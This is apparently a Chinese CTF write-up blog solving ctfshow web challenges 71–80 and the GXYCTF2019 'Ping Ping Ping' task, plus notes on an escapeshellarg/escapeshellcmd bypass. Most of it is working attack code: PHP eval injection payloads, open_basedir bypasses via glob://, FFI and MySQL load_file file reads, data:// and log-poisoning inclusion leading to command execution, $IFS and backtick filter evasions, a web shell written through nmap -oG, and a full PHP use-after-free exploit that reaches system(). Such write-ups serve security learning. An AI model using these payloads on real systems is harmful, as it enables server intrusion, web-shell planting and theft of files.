+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">//获取输出缓冲区的内容</span></span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();  <span class="comment">//清空缓冲区</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>); <span class="comment">//替换为问号&#x27;?&#x27;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样会导致我们得到的数据变成无法识别的问号</p>
+<p><img src="/img/image-20231120214646113.png" alt="image-20231120214646113"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;/flag.txt&quot;);exit(); </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>用上一题的payload试一试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;/flag.txt&quot;);exit(); </span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231120215859623.png" alt="image-20231120215859623"></p>
+<p>没有那个文件，我们扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br><span class="line">c=$a=scandir(&#x27;/&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231120220006750.png" alt="image-20231120220006750"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));exit();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231120220033245.png" alt="image-20231120220033245"></p>
+<p>var_dump被禁用，并且还有open_basedir限制读取目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">function ctfshow($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123;</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123;</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); </span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231123213548451.png" alt="image-20231123213548451"></p>
+<h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p>由于存在<code>open_basedir</code>配置的限制，无法使用<code>scandir</code>函数列出目录信息，可以使用<code>glob</code>协议绕过<code>open_basedir</code>的限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit(0);  #扫描根目录有什么文件</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;getFilename().&quot; &quot;);&#125; exit(0);</span><br><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit(0);</span><br><span class="line">c=require(&#x27;/flagc.txt&#x27;);exit(0);</span><br><span class="line">c=include_once(&#x27;/flagc.txt&#x27;);exit(0);</span><br><span class="line">c=require_once(&#x27;/flagc.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>
+
+<p>另一种读取文件的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = &quot;glob:///*.txt&quot;;</span><br><span class="line">	if ( $b =opendir($a) )&#123;</span><br><span class="line">		while ( ($file = readdir($b)) !== false )&#123;</span><br><span class="line">			echo &quot;filename:&quot;.$file.&quot;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		closedir($b);</span><br><span class="line">	&#125;exit();</span><br></pre></td></tr></table></figure>
+
+<p>他们的共同点是使用了glob:&#x2F;&#x2F;伪协议来读取文件</p>
+<h3 id="web-75"><a href="#web-75" class="headerlink" title="web 75"></a>web 75</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;getFilename().&quot; &quot;);&#125; exit(0);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ctftraining&quot;); $sql = &quot;select load_file(&#x27;/flag36.txt&#x27;) as a&quot;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row))&#123; echo $result[&#x27;a&#x27;]; &#125; exit(); </span><br></pre></td></tr></table></figure>
+
+<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);exit();</span><br></pre></td></tr></table></figure>
+
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&quot;ls /&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&quot;tac ./flag.*&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= eval($_POST[1]); ?&gt;</span><br><span class="line">post:1=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/image-20231126145455076.png" alt="image-20231126145455076"></p>
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件头写入：User-Agent:&lt;?php eval($_POST[1]); ?&gt;</span><br><span class="line">?file=/var/log/nginx/access.log</span><br><span class="line">post：1=system(&quot;tac ./fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>通过将恶意代码写入日志，再包含日志，传入参数，执行</p>
+<h2 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h2><p><code>/?ip=127.0.0.1;ls</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"></span><br><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>也可以<code>/?ip=127.0.0.1|ls</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"></span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>/?ip=127.0.0.1;tac flag.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip= fxck your space!</span><br></pre></td></tr></table></figure>
+<p>看来空格被过滤了</p>
+<p><code>?ip=127.0.0.1;cat$&#123;IFS&#125;flag.php </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip= 1fxck your symbol!</span><br></pre></td></tr></table></figure>
+
+<p><code>/?ip=127.0.0.1;cat$IFS$1flag.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip= fxck your flag!</span><br></pre></td></tr></table></figure>
+<p>发现flag也被过滤了<br>过滤了这么多，现在就先去看看index.php</p>
+<p><code>/?ip=127.0.0.1;cat$IFS$1index.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>过滤了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>
+<p>1、简单变量替换,覆盖拼接flag<br><code>/?ip=127.0.0.1;a=l;tac$IFS$9f$aag.php</code></p>
+<p><code>/?ip=127.0.0.1;b=ag.php;a=fl;tac$IFS$9$a$b</code></p>
+<p>2、内联执行<br>反引号在linux中作为内联执行，就是将反引号内命令的输出作为输入执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;tac$IFS$9`ls`</span><br></pre></td></tr></table></figure>
+
+<p>能当做system一样执行ls命令，ls的结果为flag.php和index.php<br>所以意思为：<br>?ip&#x3D;127.0.0.1;tac flag.php index.php</p>
+<p>ps:cat和tac的区别:tac命令与cat命令展示内容相反，用于将文件以行为单位的反序输出，即第一行最后显示，最后一行先显示，且不能带行输出。cat指令把flag.php的内容导出后依然遵循php的语法，那么没有echo语句，就无法显示，而tac指令将一切倒过来后：就不是php语句了，在html语句里就就会直接显示出来</p>
+<p><strong>1、call_user_func_array()</strong></p>
+<p> call_user_func_array(<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.callable.php">callable</a> <code>$callback</code>, array <code>$args</code>): mixed<br>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>args</code>）为回调函数的的参数传入</p>
+<p><code>$_SERVER[&#39;SERVER_ADDR&#39;]</code>：当前运行脚本所在的服务器的 IP 地址<br><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>：客户端 IP 地址或者是代理<br>Nmap -oG 将命令和结果写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$host = $_GET[&#x27;host&#x27;];</span><br><span class="line">$host = escapeshellarg($host);</span><br><span class="line">$host = escapeshellcmd($host);</span><br><span class="line">echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br></pre></td></tr></table></figure>
+<p>escapeshellarg()+escapeshellcmd()之殇<br>传入参数：127.0.0.1’ -v -d a&#x3D;1<br>经过escapeshellarg()函数处理后变为：<code>&#39;127.0.0.1&#39;\&#39;&#39; -v -d a=1&#39;</code>，也就是将其中的’单引号转义，再用单引号将内容包含起来<br>处理完的字符串再通过escapeshellcmd()函数的处理，变成：<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，因为escapeshellcmd()函数对\以及最后的未闭合的’进行了转义<br>由于两次函数的处理，最终参数可简化成：<code>127.0.0.1\ -v -d a=1&#39;</code>，因为包围127.0.0.1的单引号产生了闭合，<code>\\</code>被解释为\，中间的两个单引号’’完成了闭合，最终留下了a&#x3D;1’，也就是末尾的单引号</p>
+<p>两边加上单引号<code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code>可绕过</p>
+<p>preg_replace()的&#x2F;e模式存在命令执行漏洞</p>
